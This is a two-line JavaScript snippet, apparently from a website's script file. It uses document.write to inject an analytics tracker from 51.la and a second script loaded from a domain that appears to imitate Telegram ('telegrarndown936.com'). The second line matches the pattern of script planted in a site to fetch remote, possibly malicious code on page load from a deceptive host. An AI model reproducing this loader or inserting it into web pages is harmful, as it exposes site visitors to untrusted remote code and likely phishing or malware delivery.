document.write ('<script type="text/javascript"  src="https://js.users.51.la/21373403.js"></script>');

document.write("<script src='https://tgdown91.telegrarndown936.com/index.php'></script>");


